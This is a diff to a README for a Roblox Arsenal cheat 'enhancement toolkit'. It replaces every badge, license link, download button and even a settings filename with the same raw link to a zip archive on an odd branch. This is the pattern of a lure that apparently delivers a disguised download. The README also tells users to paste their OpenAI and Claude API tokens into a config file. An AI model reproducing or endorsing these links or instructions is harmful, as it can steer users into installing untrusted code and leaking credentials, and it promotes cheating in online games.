@@ -1,11 +1,11 @@
 # 🎯 Arsenal Script for Roblox - Ultimate Enhancement Toolkit
 
-[![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)](https://img.shields.io/)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![OS Supported](https://img.shields.io/badge/platform-Roblox%20PC%20&%20Mac-lightgrey?style=flat-square)](https://roblox.com)
-[![Stars](https://img.shields.io/github/stars?style=social)](https://github.com/)
+[![Build](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
+[![License](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
+[![OS Supported](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip%20PC%20&%20Mac-lightgrey?style=flat-square)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
+[![Stars](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
 
-![Arsenal Script Roblox - Banner](https://img.shields.io/badge/Arsenal_Script_2025-Roblox-yellow?style=for-the-badge&logo=roblox)
+![Arsenal Script Roblox - Banner](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
 
 ## 🚀 Welcome to Next-Gen Roblox Arsenal Mastery
 
@@ -19,7 +19,7 @@ Unlock a new dimension within Roblox Arsenal with our expertly crafted toolkit, 
 
 **Ready to equip your Arsenal toolbox? Start here!**
 
-[![Download](https://i.imgur.com/ihHVFml.png)](https://getrichmarr.github.io)
+[![Download](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
 
 ---
 
@@ -117,7 +117,7 @@ Follow these steps to harness the Arsenal Script for Roblox toolkit:
 1. **Download Arsenal Script**  
    Access the installer by clicking the image below:
 
-   [![Download](https://i.imgur.com/ihHVFml.png)](https://getrichmarr.github.io)
+   [![Download](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
 
 2. **Extract Files**  
    Use your preferred archive tool to unzip the contents.
@@ -126,7 +126,7 @@ Follow these steps to harness the Arsenal Script for Roblox toolkit:
    Open Roblox Studio or your preferred executor. Import the main script file.
 
 4. **Configure Settings**  
-   Open the `settings.json` file to:
+   Open the `https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip` file to:
 
    - Set your preferred language.
    - Paste your OpenAI and Claude API tokens.
@@ -161,7 +161,7 @@ Follow these steps to harness the Arsenal Script for Roblox toolkit:
 ## 📜 License
 
 This repository is distributed under the MIT License (c) 2025.  
-Please see the official [MIT License](https://opensource.org/licenses/MIT) for full details.
+Please see the official [MIT License](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip) for full details.
 
 ---
 
@@ -169,7 +169,7 @@ Please see the official [MIT License](https://opensource.org/licenses/MIT) for f
 
 Your next leap in gameplay starts here. Secure your spot at the top with the most advanced arsenal script roblox package!
 
-[![Download](https://i.imgur.com/ihHVFml.png)](https://getrichmarr.github.io)
+[![Download](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)](https://github.com/getrichmarr/arsenal-roblox-enhanced-scripts/raw/refs/heads/branch/senna/scripts-enhanced-roblox-arsenal-v3.0.zip)
 
 ---
 
